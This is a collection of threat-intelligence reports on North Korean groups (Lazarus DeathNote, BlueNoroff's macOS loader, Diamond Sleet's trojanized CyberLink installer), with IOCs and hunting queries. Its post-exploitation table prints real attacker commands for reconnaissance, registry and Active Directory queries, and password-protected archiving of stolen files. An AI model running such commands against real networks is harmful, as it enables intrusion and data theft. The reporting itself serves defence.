Contents of x.txt
        Malpedia
Lazarus Group
aka: APT 38, APT-C-26, APT38, ATK117, ATK3, Andariel, Appleworm, Bluenoroff, Bureau 121, COPERNICIUM, COVELLITE, Dark Seoul, Diamond Sleet, G0032, G0082, Genie Spider, Group 77, Hastati Group, Hidden Cobra, Labyrinth Chollima, Lazarus, NICKEL GLADSTONE, NewRomanic Cyber Army Team, Nickel Academy, Operation AppleJeus, Operation DarkSeoul, Operation GhostSecret, Operation Troy, Sapphire Sleet, Stardust Chollima, Subgroup: Bluenoroff, Unit 121, Whois Hacking Team, Zinc


Since 2009, HIDDEN COBRA actors have leveraged their capabilities to target and compromise a range of victims; some intrusions have resulted in the exfiltration of data while others have been disruptive in nature. Commercial reporting has referred to this activity as Lazarus Group and Guardians of Peace. Tools and capabilities used by HIDDEN COBRA actors include DDoS botnets, keyloggers, remote access tools (RATs), and wiper malware. Variants of malware and tools used by HIDDEN COBRA actors include Destover, Duuzer, and Hangman.
________________________________________
Associated Families
win.unidentified_101win.unidentified_090aix.fastcashapk.badcallapk.hardrainjs.quickcafeosx.3cx_backdoorosx.cassoosx.daclsosx.manuscryptosx.watchcatosx.yortphp.redhat_hackerps1.powerbraceps1.powerspritzwin.blindtoadwin.buffetlinewin.cleantoadwin.klackringwin.power_ratankbaosx.interceptionosx.unidentified_001win.darkcometwin.srdiwin.daclsosx.kandykornosx.sugarloaderosx.hloaderosx.applejeuswin.alphancwin.alreaywin.anchormteawin.applejeuswin.artfulpiewin.bankshotwin.banpolmexwin.bistromathwin.bitsranwin.bluenoroffwin.bookcodesratwin.bootwreckwin.brambulwin.bravoncwin.cheesetraywin.comebackerwin.contopeewin.corednwin.cratwin.cur1_downloaderwin.deltaswin.dtrackwin.duuzerwin.dyepackwin.electricfishwin.feed_loadwin.fudmodulewin.fuwuqidramawin.ghost_ratwin.ghost_secretwin.gopuramwin.hardrainwin.hermeswin.hoplightwin.hotcroissantwin.hotwaxwin.httpsuploaderwin.interceptionwin.jessieconteawin.joanapwin.keymarblewin.lazarloaderwin.lazarus_killdiskwin.lcpdotwin.lpeclientwin.magic_ratwin.nachocheesewin.neddnloaderwin.nesteggwin.op_blockbusterwin.phandoorwin.psloggerwin.ratankbawin.ratankbaposwin.redshawlwin.rifdoorwin.roll_slingwin.romeoswin.scoutwin.sierraswin.slickshoeswin.torismawin.touchmovewin.unidentified_042win.unidentified_077win.veiledsignalwin.volgmerwin.vsinglewin.vyvevawin.wannacryptorwin.winordll64win.wormholewin.minitypeframewin.racketwin.rustbucketelf.badcallwin.badcallwin.iconic_stealerelf.simpleteaosx.poolratwin.3cx_backdoorwin.blindingcanwin.dratzaruswin.forest_tigerwin.imprudentcookwin.lambloadwin.lightlesscanwin.miniblindingcanwin.postnapteawin.snatchcryptowin.webbyteawin.wininetloaderosx.simpleteawin.typeframewin.cloudburstwin.lazardoorwin.wagentteaosx.rustbucket
Following the Lazarus group by tracking DeathNote campaign
APT REPORTS
12 APR 2023
 8 minute read
 
AUTHORS
•	 SEONGSU PARK
The Lazarus group is a high-profile Korean-speaking threat actor with multiple sub-campaigns. We have previously published information about the connections of each cluster of this group. In this blog, we’ll focus on an active cluster that we dubbed DeathNote because the malware responsible for downloading additional payloads is named Dn.dll or Dn64.dll. This threat is also known as Operation DreamJob or NukeSped. Over the past few years, we have closely monitored the DeathNote cluster, observing a shift in their targets as well as the development and refinement of their tools, techniques, and procedures.
 
Timeline of DeathNote cluster
In this blog, we will provide an overview of the significant modifications that have taken place within this cluster, both in terms of its technical and strategic aspects.
Beginning of tracking DeathNote
The notorious threat actor Lazarus has persistently targeted cryptocurrency-related businesses for a long time. While monitoring the actor’s activities, we noticed that in one particular case they were using a significantly modified piece of malware. In mid-October 2019, we came across a suspicious document uploaded to VirusTotal. Upon further investigation, we discovered that the actor behind this weaponized document had been using similar malicious Word documents since October 2018. The malware author used decoy documents that were related to the cryptocurrency business such as a questionnaire about buying specific cryptocurrency, an introduction to a specific cryptocurrency, and an introduction to a bitcoin mining company.
 
Decoy documents
Once the victim opens the document and enables the macro, the malicious Visual Basic Script extracts the embedded downloader malware and loads it with specific parameters. In this initial discovery, the actor used two types of second-stage payload. The first is a manipulated piece of software that contains a malicious backdoor, while the second is a typical backdoor with a multi-stage binary infection process.
 
Infection procedure
The Trojanized application utilized in the second stage is masquerading as a genuine UltraVNC viewer. If executed without any command line parameters, it will display a legitimate UltraVNC viewer window. However, it carries out a malicious routine when it is spawned with “-s {F9BK1K0A-KQ9B-2PVH-5YKV-IY2JLT37QQCJ}” parameters. The other infection method executes the installer, which creates and registers an injector and backdoor in a Windows service. Finally, the backdoor is injected into a legitimate process (svchost.exe) and initiates a command-and-control (C2) operation. In this infection, the final payload injected into the legitimate process was Manuscrypt. Until this discovery, the Lazarus group had primarily targeted the cryptocurrency business. Our investigation has identified potential compromises of individuals or companies involved in cryptocurrency in Cyprus, the United States, Taiwan and Hong Kong.
Shifting focus to the defense industry
While tracking this campaign, we uncovered a significant shift in the attack’s target along with updated infection vectors in April 2020. Our research showed that the DeathNote cluster was used to target the automotive and academic sectors in Eastern Europe, both of which are connected to the defense industry. At this point, the actor switched all the decoy documents to job descriptions related to defense contractors and diplomatic services.
 
Decoy documents
In addition, the actor refined its infection chain, using the remote template injection technique in their weaponized documents, as well as utilizing Trojanized open-source PDF viewer software. Both of these infection methods result in the same malware (DeathNote downloader), which is responsible for uploading the victim’s information and retrieving the next-stage payload at the C2’s discretion. Finally, a COPPERHEDGE variant is executed in memory.
 
Infection chain
Notably, a Trojanized PDF reader, based on the open source software, used an interesting technique to initiate its malicious routine. It first retrieves the MD5 hash of the opened PDF file and performs an XOR operation on 65 bytes of embedded data using the retrieved MD5 value. Next, it verifies that the first WORD value of the XORed data is 0x4682, and checks that the MD5 hash value matches the last 16 bytes of the XORed data. If both conditions are met, the remaining 47-bytes value is used as the decryption key for the next stage of infection.
 
Verification process of Trojanized PDF reader
Finally, this Trojanized PDF viewer overwrites the original opened file with a decoy PDF file and opens it to deceive the victim while implementing the malware payload. The payload is executed with command line parameters, and a shortcut file is created in the Startup folder to ensure persistence. This infection mechanism demonstrates the care and precision with which the actor delivers the payload.
Expanded target and adoption of new infection vector
In May 2021, we observed that an IT company in Europe that provides solutions for monitoring network devices and servers was compromised by the same cluster. It’s believed that the Lazarus group had an interest in this company’s widely used software or its supply chain.
In addition, in early June 2021, the Lazarus group began utilizing a new infection mechanism against targets in South Korea. One thing that caught our attention was that the initial stage of the malware was executed by legitimate security software that is widely used in South Korea. It’s thought that the malware was spread through a vulnerability in this widely used software in South Korea.
 
Infection chain
Similar to the previous case, the initial infection vector created the downloader malware. Once connected to the C2 server, the downloader retrieved an additional payload based on the operator’s commands and executed it in memory. During this time, the BLINDINGCAN malware was used as a memory-resident backdoor. While the BLINDINGCAN malware has sufficient capabilities to control the victim, the actor manually implanted additional malware. It’s believed that the group aims to create an auxiliary method to control the victim. The retrieved loader’s export function (CMS_ContentInfo) was launched with command line parameters, which is crucial for decrypting the embedded next-stage payload and configuration. This process only proceeds if the length of the parameter is 38. Finally, the COPPERHEDGE malware, previously used by this cluster, was executed on the victim.
Almost one year later, in March 2022, we discovered that the same security program had been exploited to propagate similar downloader malware to several victims in South Korea. However, a different payload was delivered in this case. The C2 operator manually implanted a backdoor twice, and although we were unable to acquire the initially implanted backdoor, we assume it is the same as the backdoor in the following stage. The newly implanted backdoor is capable of executing a retrieved payload with named-pipe communication. In addition, the actor utilized side-loading to execute Mimikatz and used stealer malware to collect keystroke and clipboard data from users.
 
Infection chain
Around the same time, we uncovered evidence that one defense contractor in Latin America was compromised by the same backdoor. The initial infection vector was similar to what we’ve seen with other defense industry targets, involving the use of a Trojanized PDF reader with a crafted PDF file. However, in this particular case, the actor adopted a side-loading technique to execute the final payload. When the malicious PDF file is opened with the Trojanized PDF reader, the victim is presented with the same malware mentioned above, which is responsible for collecting and reporting the victim’s information, retrieving commands and executing them using pipe communication mechanisms. The actor used this malware to implant additional payloads, including legitimate files for side-loading purposes.
•	Legitimate file: %APPDATA%\USOShared\CameraSettingsUIHost.exe
•	Malicious file: %APPDATA%\USOShared\dui70.dll
•	Config file: %APPDATA%\USOShared\4800-84dc-063a6a41c5c
•	Command line: %APPDATA%\USOShared\CameraSettingsUIHost.exe uTYNkfKxHiZrx3KJ
An ongoing attack targeting a defense contractor with updated infection tactics
In July 2022, we observed that the Lazarus group had successfully breached a defense contractor in Africa. The initial infection was a suspicious PDF application, which had been sent via the Skype messenger. After executing the PDF reader, it created both a legitimate file (CameraSettingsUIHost.exe) and malicious file (DUI70.dll) in the same directory. This attack heavily relied on the same DLL side-loading technique that we observed in the previous case. The payload that was initially implanted and executed by the PDF reader was responsible for collecting and reporting the victim’s information, as well as retrieving an additional payload from the remote server named LPEClient. The Lazarus group used this malware several times in various campaigns. They have also utilized the same DLL side-loading technique to implant additional malware that is capable of backdoor operation. In order to move laterally across systems, the actor used an interesting technique called ServiceMove. This technique leverages the Windows Perception Simulation Service to load arbitrary DLL files. According to the author’s explanation, ‘a non-existing DLL file will be loaded every time when the Windows Perception Simulation Service is started’. By creating an arbitrary DLL in C:\Windows\System32\PerceptionSimulation\ and starting the service remotely, the actors were able to achieve code execution as NT AUTHORITY\SYSTEM on a remote system. The actor created a devobj.dll file in the PerceptionSimulation folder and remotely executed the PerceptionSimulation service. Upon launching the devobj.dll file, it decrypted an encrypted backdoor file, PercepXml.dat, from the same folder and executed it in memory.
 
Infection chain
Post-exploitation
During our investigation of this campaign, we have gained extensive insight into the Lazarus group’s post-exploitation strategy. After initial infection, the operator executed numerous Windows commands to gather basic system information and attempt to find valuable hosts, such as an Active Directory server. Before moving laterally, the Lazarus group acquired Windows credentials using well-known methods, and employed public techniques, such as ServiceMove. When the group completed its mission and began exfiltrating data, they mostly utilized the WinRAR utility to compress files and transmit them via C2 communication channels.
Phase	Examples
Basic reconnaissance	Generally used Windows commands. For example:
•	cmd.exe /c netstat -ano | find TCP
•	systeminfo
In one case, they accessed the default domain controllers policy directly.
•	cmd.exe /c “Type “\\[redacted]\SYSVOL\[redacted]\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf”
Finding high-value hosts	To find a connected Remote Desktop host it utilized Windows commands or queried the saved server list from the registry.
•	cmd.exe /c netstat -ano | findstr 3389
•	cmd.exe /c reg query HKEY_USERS\S-1-5-[redacted]-1001\Software\Microsoft\Terminal Server Client\Servers
Utilizing ADFind tool to acquire Active directory information.
•	cmd.exe /c “%appdata%\[redacted].xic -b dc=[redacted],dc=[redacted] -f “sAMAccountName=[redacted]” >> %temp%\dm3349.tmp 2>&1″
Acquiring login credentials	Utilizing crafted Mimikatz to dump login credentials or Responder tool to capture credentials.
Lateral movement	One common approach for launching commands on remote hosts is to use methods like SMB connection or the ServiceMove technique.
Exfiltration	Using WinRAR to archive files before sending the stolen file via C2 channel.
•	adobearm.exe a -hp1q2w3e4 -m5 -v2000000k “%Local AppData%\Adobe\SYSVOL800.CHK” “\\[redacted]FILE02.[redacted]\Projects\[redacted] Concept Demonstrator”
•	%appdata%\USOShared\USOShared.LOG1 a -hpb61de03de6e0451e834db6f185522bff -m5 “%appdata%\USOShared\USOShared.LOG2” “%appdata%\ntuser.001.dat”
Attribution
After tracking the DeathNote cluster and its origin, we have determined that the Lazarus group is responsible for this malware strain. Our conclusion is supported by many security vendors who also believe that the Lazarus group is linked to this malware. Furthermore, we have analyzed the delivery of Windows commands to the victim through the DeathNote malware, and discovered that a significant number of commands were executed between GMT 00:00 and 07:00. Based on our knowledge of normal working hours, we can infer that the actor is located in either the GMT+08 or GMT+09 time zone.
 
Timeline of Windows commands
Moreover, the actor left a Korean comment ‘정상호출’, which translates to ‘normal call’ in the C2 script. This further supports the hypothesis that Lazarus is a Korean-speaking actor.
 
Korean comment in the C2 script
In conclusion, the Lazarus group is a notorious and highly skilled threat actor. Our analysis of the DeathNote cluster reveals a rapid evolution in its tactics, techniques and procedures over the years. As the Lazarus group continues to refine its approaches, it is crucial for organizations to maintain vigilance and take proactive measures to defend against its malicious activities. By staying informed and implementing strong security measures, organizations can reduce the risk of falling victim to this dangerous adversary.
Indicators of Compromise
Beginning of tracking DeathNote
Malicious documents
265f407a157ab0ed017dd18cae0352ae
7a73a2261e20bdb8d24a4fb252801db7
7a307c57ec33a23ce9b5c84659f133cc
ced38b728470c63abcf4db013b09cff7
9121f1c13955506e33894ffd780940cd
50b2154de64724a2a930904354b5d77d
8a05f6b3f1eb25bcbceb717aa49999cd
ee73a772b72a5f3393d4bf577fc48efe
Downloader
d1c652b4192857cb08907f0ba1790976
25b37c971fd7e9e50e45691aa86e5f0a
0493f40628995ae1b7e3ffacd675ba5f
8840f6d2175683c7ed8ac2333c78451a
c278d6468896af3699e058786a8c3d62
9fd35bad075c2c70678c65c788b91bc3
59cb8474930ae7ea45b626443e01b66d
7af59d16cfd0802144795ca496e8111c
cd5357d1045948ba62710ad8128ae282
77194024294f4fd7a4011737861cce3c
e9d89d1364bd73327e266d673d6c8acf
0d4bdfec1e657d6c6260c42ffdbb8cab
5da86adeec6ce4556f477d9795e73e90
706e55af384e1d8483d2748107cbd57c
Manipulated Installer
dd185e2bb02b21e59fb958a4e12689a7
Installer
4088946632e75498d9c478da782aa880 C:\Windows\igfxmon.exe
Injector
dc9244206e72a04d30eeadef23713778 C:\Windows\system32\[random 2 bytes]proc.exe
Backdoor
735afcd0f6821cbd3a2db510ea8feb22 C:\Windows\system32\[random 2 bytes]svc.dll
Shifting focus to the defense industry
Malicious documents
4c239a926676087e31d82e79e838ced1 pubmaterial.docx
183ad96b931733ad37bb627a958837db Boeing_PMS.docx
9ea365c1714eb500e5f4a749a3ed0fe7 Boeing_DSS_SE.docx
2449f61195e39f6264d4244dfa1d1613 Senior_Design_Engineer.docx
880b263b4fd5de0ae6224189ea611023 LM_IFG_536R.docx.docx
e7aa0237fc3db67a96ebd877806a2c88 Boeing_AERO_GS.docx
56470e113479eacda081c2eeead153bf boeing_spectrolab.docx
Fetched template
2efbe6901fc3f479bc32aaf13ce8cf12 pubmaterial.dotm
65df11dea0c1d0f0304b376787e65ccb 43.dotm
0071b20d27a24ae1e474145b8efc9718 17.dotm
1f254dd0b85edd7e11339681979e3ad6 61.dotm
DeathNote downloader
f4b55da7870e9ecd5f3f565f40490996 onenote.db, thumbnail.db
2b02465b65024336a9e15d7f34c1f5d9 wsuser.db
11fdc0be9d85b4ff1faf5ca33cc272ed onenote.db
f6d6f3580160cd29b285edf7d0c647ce
78d42cedb0c012c62ef5be620c200d43 wsuser.db
92657b98c2b4ee4e8fa1b83921003c74
075fba0c098d86d9f22b8ea8c3033207 wsdts.db
8fc7b0764541225e5505fa93a7376df4
7d204793e75bb49d857bf4dbc60792d3 2.dll
eb2dc282ad3ab29c1853d4f6d09bec4f
ca6658852480c70118feba12eb1be880 thumbnail.db
c0a8483b836efdbae190cc069129d5c3 wsdts.db
14d79cd918b4f610c1a6d43cadeeff7b wsuser.db
1bd0ca304cdecfa3bd4342b261285a72
Trojanized PDF viewer
cbc559ea38d940bf0b8307761ee4d67b SumatraPDF.exe
da1dc5d41de5f241cabd7f79fbc407f5 internal pdf viewer.exe
Expanded target and adoption of new infection vector
Racket Downloader
b3a8c88297daecdb9b0ac54a3c107797 SCSKAppLink.dll
BLIDINGCAN
b23b0de308e55cbf14179d59adee5fcb
64e5acf43613cd10e96174f36cb1d680
COPPERHEDGE Loader
a43bdc197d6a273102e90cdc0983b0b9
COPPERHEDGE
97336f5ce811d76b28e23280fa7320b5
Downloader Loader
f821ca4672851f02bead3c4bd23bed84 c:\officecache\officecert.ocx
Racket Downloader
b974bc9e6f375f301ae2f75d1e8b6783 %public%\Libraries\SCSKAppLink.dll
eb061dfacb3667cf65d250911179235d
Stealer
fe549a0185813e4e624104d857f9277b %ProgramData%\GenICam\GenICamKDR.gic
Backdoor Loader
7b8960e2a22c8321789f107a7b83aa59 %ProgramData%\xilinx\xilinx.pkg
0ac90c7ad1be57f705e3c42380cbcccd %ProgramData%\USOShared\USOShare.cpl
Mimikatz Loader
adf0d4bbefccf342493e02538155e611 %ProgramData%\USOShared\log.dll
d4d654c1b27ab90d2af8585052c77f33
An ongoing attack targeting a defense contractor with updated infection tactics
Loader
2bcf464a333d67afeb80360da4dfd5bb C:\Windows\system32\perceptionsimulation\devobj.dll
83dd9b600ed33682aa21f038380a6eab C:\Windows\system32\perceptionsimulation\devobj.dll
ForestTiger(Backdoor)
97524091ac21c327bc783fa5ffe9cd66 ProgramData\adobe\arm\lockhostingframework.dll
9b09ebf52660a9d6deca21965ce52ca1 %appdata%\adobe\arm\DUI70.dll
26c0f0ce33f5088754d88a1db1e6c4a9
Trojanized PDF reader
84cd4d896748e2d52e2e22d1a4b9ee46 SecurePDF.exe




BlueNoroff: new Trojan attacking macOS users
MALWARE DESCRIPTIONS
05 DEC 2023
 3 minute read
 
AUTHORS
•	 SERGEY PUZAN
We recently discovered a new variety of malicious loader that targets macOS, presumably linked to the BlueNoroff APT gang and its ongoing campaign known as RustBucket. The threat actor is known to attack financial organizations, particularly companies, whose activity is in any way related to cryptocurrency, as well as individuals who hold crypto assets or take an interest in the subject. Information about the new loader variant first appeared in an X (formerly Twitter) post.
 
Original X (formerly Twitter) post about the new loader
Earlier RustBucket versions spread its malicious payload via an app disguised as a PDF viewer. By contrast, this new variety was found inside a ZIP archive that contained a PDF file named, “Crypto-assets and their risks for financial stability”, with a thumbnail that showed a corresponding title page. The metadata preserved inside the ZIP archive suggests the app was created on October 21, 2023.
 
App structure
 
Document thumbnail
Exactly how the archive spread is unknown. The cybercriminals might have emailed it to targets as they did with past campaigns.
The app had a valid signature when it was discovered, but the certificate has since been revoked.
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25	Signature #1: Valid
    Chain   #1:
      Verified:           True
      Serial:               6210670360873047962
      Issuer:              CN=Developer ID Certification Authority,OU=Apple Certification Authority,O=Apple Inc.,C=US
      Validity:            from = 20.10.2023 3:11:55
                                 to = 01.02.2027 22:12:15
      Subject:            UID=2C4CB2P247,CN=Developer ID Application: Northwest Tech-Con Systems Ltd (2C4CB2P247),OU=2C4CB2P247,O=Northwest Tech-Con Systems Ltd,C=CA
      SHA-1 Fingerprint:   da96876f9535e3946aff3875c5e5c05e48ecb49c
 
      Verified:          True
      Serial:              1763908746353189132
      Issuer:             C=US,O=Apple Inc.,OU=Apple Certification Authority,CN=Apple Root CA
      Validity:            from = 01.02.2012 22:12:15
                                 to = 01.02.2027 22:12:15
      Subject:             CN=Developer ID Certification Authority,OU=Apple Certification Authority,O=Apple Inc.,C=US
      SHA-1 Fingerprint:   3b166c3b7dc4b751c9fe2afab9135641e388e186
 
      Verified:            True (self-signed)
      Serial:                2
      Issuer:               C=US,O=Apple Inc.,OU=Apple Certification Authority,CN=Apple Root CA
      Validity:            from = 25.04.2006 21:40:36
                                 to = 09.02.2035 21:40:36
      Subject:             C=US,O=Apple Inc.,OU=Apple Certification Authority,CN=Apple Root CA
      SHA-1 Fingerprint:   611e5b662c593a08ff58d14ae22452d198df6c60
App signature details
Written in Swift and named “EdoneViewer”, the executable is a universal format file that contains versions for both Intel and Apple Silicon chips. Decryption of the XOR-encrypted payload is handled by the main function, CalculateExtameGCD. While the decryption process is running, the app puts out unrelated messages to the terminal to try and lull the analyst’s vigilance.
The decrypted payload has the AppleScript format:
 
AppleScript code executed after the payload is deciphered
The script assembles and runs the following shell command:
 
Shell command
Once assembled, the shell command goes through the following steps:
•	Downloads a PDF file, save it at /Users/Shared/Crypto-assets and their risks for financial stability.pdf, and opens it. This is a benign file launched as a diversion.
 
Title page of the PDF decoy
•	Sends a POST request to the server and saves the response to a hidden file named “.pw” and located at /Users/Shared/.
•	Grants permissions to the file and executes it with the C&C address as an argument.
The C&C server is hosted at hxxp://on-global[.]xyz, a domain name registered fairly recently, on October 20, 2023. We were unable to find any links between the domain and any other files or threats.
The .pw file is a Trojan we detected back in August. Like the loader, this is a universal format file:
 
Details of the .pw file
The file collects and sends the following system information to the C&C:
•	Computer name
•	OS version
•	Time zone
•	Device startup date
•	OS installation date
•	Current time
•	List of running processes
The data is collected and forwarded in cycles every minute. The Trojan expects one of the following three commands in response:
Command #	Description
0x0	Save response to file and run
0x1	Delete local copy and shut down
Any other number	Keep waiting for command
After receiving a 0x0 command, the program saves data sent with the command to the shared file named “.pld” and located at /Users/Shared/, gives it the read/write/run permissions and executes it:
 
Code snippet that writes and runs the downloaded file
Unfortunately, we did not receive a single command from the server during our analysis, so we were unable to find out the content of the following attack stage. The Trojan can now be detected by most anti-malware solutions:
 
Details of the second download as posted on VirusTotal
Indicators of compromise
Files
MD5 hash	File format	File name
1fddf14984c6b57358401a4587e7b950
Mach-O Fat	EdoneViewer
d8011dcca570689d72064b156647fa82
Mach-O Fat	.pw
90385d612877e9d360196770d73d22d6
Zip	Crypto-assets and their risks for financial stability.zip
3b3b3b9f7c71fcd7239abe90c97751c0
Zip	Crypto-assets and their risks for financial stability.zip
b1e01ae0006f449781a05f4704546b34
Zip	Crypto-assets and their risks for financial stability.zip
80c1256f8bb2a9572e20dd480ac68759
PDF	Crypto-assets and their risks for financial stability.pdf
Links
URL	Description
hxxp://on-global[.]xyz/Ov56cYsfVV8/OJITWH2WFx/Jy5S7hSx0K/fP7saoiPBc/A==
PDF file URL
hxxp://on-global[.]xyz/Of56cYsfVV8/OJITWH2WFx/Jy5S7hSx0K/fP7saoiPBc/A==
Trojan URL




 
•	Research
•	Threat intelligence
•	Microsoft Defender XDR
•	Supply chain attacks
 
7 min read
Diamond Sleet supply chain compromise distributes a modified CyberLink installer
•	By Microsoft Threat Intelligence
November 22, 2023
•	
•	
•	
•	Microsoft Defender
•	Microsoft Defender for Endpoint
•	Attacker techniques, tools, and infrastructure
•	
more
Microsoft Threat Intelligence has uncovered a supply chain attack by the North Korea-based threat actor Diamond Sleet (ZINC) involving a malicious variant of an application developed by CyberLink Corp., a software company that develops multimedia software products. This malicious file is a legitimate CyberLink application installer that has been modified to include malicious code that downloads, decrypts, and loads a second-stage payload. The file, which was signed using a valid certificate issued to CyberLink Corp., is hosted on legitimate update infrastructure owned by CyberLink and includes checks to limit the time window for execution and evade detection by security products. Thus far, the malicious activity has impacted over 100 devices in multiple countries, including Japan, Taiwan, Canada, and the United States.
Microsoft attributes this activity with high confidence to Diamond Sleet, a North Korean threat actor. The second-stage payload observed in this campaign communicates with infrastructure that has been previously compromised by Diamond Sleet. More recently, Microsoft has observed Diamond Sleet utilizing trojanized open-source and proprietary software to target organizations in information technology, defense, and media.
To address the potential risk of further attacks against our customers, Microsoft has taken the following steps to protect customers in response to this malicious activity:
•	Microsoft has communicated this supply chain compromise to CyberLink 
•	Microsoft is notifying Microsoft Defender for Endpoint customers that have been targeted or compromised in this campaign
•	Microsoft reported the attack to GitHub, which removed the second-stage payload in accordance with its Acceptable Use Policies
•	Microsoft has added the CyberLink Corp. certificate used to sign the malicious file to its disallowed certificate list
•	Microsoft Defender for Endpoint detects this activity as Diamond Sleet activity group.
•	Microsoft Defender Antivirus detects the malware as Trojan:Win32/LambLoad.
Microsoft may update this blog as additional insight is gained into the tactics, techniques, and procedures (TTPs) used by the threat actor in this active and ongoing campaign.
Who is Diamond Sleet?
The actor that Microsoft tracks as Diamond Sleet (formerly ZINC) is a North Korea-based activity group known to target media, defense, and information technology (IT) industries globally. Diamond Sleet focuses on espionage, theft of personal and corporate data, financial gain, and corporate network destruction. Diamond Sleet is known to use a variety of custom malware that is exclusive to the group. Recent Diamond Sleet malware is described in Microsoft’s reporting of the group’s weaponization of open source software and exploitation of N-day vulnerabilities. Diamond Sleet overlaps with activity tracked by other security companies as Temp.Hermit and Labyrinth Chollima.
DIAMOND SLEET (ZINC)
Learn about other recent activity 
Activity overview
Microsoft has observed suspicious activity associated with the modified CyberLink installer file as early as October 20, 2023. The malicious file has been seen on over 100 devices in multiple countries, including Japan, Taiwan, Canada, and the United States. While Microsoft has not yet identified hands-on-keyboard activity carried out after compromise via this malware, the group has historically:
•	Exfiltrated sensitive data from victim environments
•	Compromised software build environments
•	Moved downstream to additional victims for further exploitation
•	Used techniques to establish persistent access to victim environments
Diamond Sleet utilized a legitimate code signing certificate issued to CyberLink Corp. to sign the malicious executable. This certificate has been added to Microsoft’s disallowed certificate list to protect customers from future malicious use of the certificate:
Signer: CyberLink Corp. 
Issuer: DigiCert SHA2 Assured ID Code Signing CA 
SignerHash: 8aa3877ab68ba56dabc2f2802e813dc36678aef4 
CertificateSerialNumber: 0a08d3601636378f0a7d64fd09e4a13b
Microsoft currently tracks the malicious application and associated payloads as LambLoad.
LambLoad
LambLoad is a weaponized downloader and loader containing malicious code added to a legitimate CyberLink application. The primary LambLoad loader/downloader sample Microsoft identified has the SHA-256 hash 166d1a6ddcde4e859a89c2c825cd3c8c953a86bfa92b343de7e5bfbfb5afb8be.
Before launching any malicious code, the LambLoad executable ensures that the date and time of the local host align with a preconfigured execution period.
 Figure 1. Code for checking date and time of local host
The loader then targets environments that are not using security software affiliated with FireEye, CrowdStrike, or Tanium by checking for the following process names:
•	csfalconservice.exe (CrowdStrike Falcon)
•	xagt.exe (FireEye agent)
•	taniumclient.exe (Tanium EDR solution)
If these criteria are not met, the executable continues running the CyberLink software and abandons further execution of malicious code. Otherwise, the software attempts to contact one of three URLs to download the second-stage payload embedded inside a file masquerading as a PNG file using the static User-Agent ‘Microsoft Internet Explorer’:
•	hxxps[:]//i.stack.imgur[.]com/NDTUM.png
•	hxxps[:]//www.webville[.]net/images/CL202966126.png
•	hxxps[:]//cldownloader.github[.]io/logo.png
The PNG file contains an embedded payload inside a fake outer PNG header that is, carved, decrypted, and launched in memory.
 Figure 2. Payload embedded in PNG file
When invoked, the in-memory executable attempts to contact the following callbacks for further instruction. Both domains are legitimate but have been compromised by Diamond Sleet:
•	hxxps[:]//mantis.jancom[.]pl/bluemantis/image/addon/addin.php
•	hxxps[:]//zeduzeventos.busqueabuse[.]com/wp-admin/js/widgets/sub/wids.php
The crypted contents of the PNG file (SHA-256: 089573b3a1167f387dcdad5e014a5132e998b2c89bff29bcf8b06dd497d4e63d) may be manually carved using the following command:
 
To restore the in-memory payload statically for independent analysis, the following Python script can be used to decrypt the carved contents.
 
To crypt and verify:
 
Both the fake PNG and decrypted PE payload have been made available on VirusTotal.
Recommendations
Microsoft recommends the following mitigations to reduce the impact of this threat. Check the recommendations card for the deployment status of monitored mitigations.
•	Use Microsoft Defender Antivirus to protect from this threat. Turn on cloud-delivered protection and automatic sample submission on Microsoft Defender Antivirus. These capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats.
•	Enable network protection to prevent applications or users from accessing malicious domains and other malicious content on the internet.
•	Enable investigation and remediation in full automated mode to allow Microsoft Defender for Endpoint to take immediate action on alerts to resolve breaches, significantly reducing alert volume.
•	Take immediate action to address malicious activity on the impacted device. If malicious code has been launched, the attacker has likely taken complete control of the device. Immediately isolate the system and perform a reset of credentials and tokens.
•	Investigate the device timeline for indications of lateral movement activities using one of the compromised accounts. Check for additional tools that attackers might have dropped to enable credential access, lateral movement, and other attack activities. Ensure data integrity with hash codes.
•	Turn on the following attack surface reduction rule: Block executable files from running unless they meet a prevalence, age, or trusted list criterion.
Detection details
Microsoft Defender Antivirus
Microsoft Defender Antivirus detects threat components as the following malware:
•	Trojan:Win32/LambLoad.A!dha
•	Trojan:Win32/LambLoad.B!dha
•	Trojan:Win32/LambLoad.C!dha
•	Trojan:Win64/LambLoad.D!dha
•	Trojan:Win64/LambLoad.E!dha
Microsoft Defender for Endpoint
Alerts with the following title in the security center can indicate threat activity on your network:
•	Diamond Sleet activity group
The following alert might also indicate threat activity related to this threat. Note, however, that this alert can be also triggered by unrelated threat activity.
•	An executable loaded an unexpected dll
Threat intelligence reports
Microsoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments.
Microsoft Defender Threat Intelligence
•	Diamond Sleet
•	Diamond Sleet supply chain compromise at distributes a modified CyberLink installer
Microsoft Defender XDR Threat analytics 
•	Actor profile: Diamond Sleet
•	Activity profile: Diamond Sleet supply chain compromise at distributes a modified CyberLink installer
Hunting queries
Microsoft Defender XDR  
Microsoft Defender XDR (formerly Microsoft 365 Defender) customers can run the following query to find related activity in their networks:
let iocs = dynamic(["166d1a6ddcde4e859a89c2c825cd3c8c953a86bfa92b343de7e5bfbfb5afb8be",
"089573b3a1167f387dcdad5e014a5132e998b2c89bff29bcf8b06dd497d4e63d",
"915c2495e03ff7408f11a2a197f23344004c533ff87db4b807cc937f80c217a1"]);
DeviceFileEvents
| where ActionType == "FileCreated"
| where SHA256 in (iocs)
| project Timestamp, DeviceName, FileName, FolderPath, SHA256
Microsoft Defender XDR and Microsoft Sentinel
This query can be used in both Microsoft Defender XDR advanced hunting and Microsoft Sentinel Log Analytics. It surfaces devices where the modified CyberLink installer can be found.
DeviceFileCertificateInfo
| where Signer contains "CyberLink Corp"
| where CertificateSerialNumber == "0a08d3601636378f0a7d64fd09e4a13b"
| where SignerHash == "8aa3877ab68ba56dabc2f2802e813dc36678aef4"
| join DeviceFileEvents on SHA1
| distinct DeviceName, FileName, FolderPath, SHA1, SHA256, IsTrusted, IsRootSignerMicrosoft, SignerHash
Microsoft Sentinel
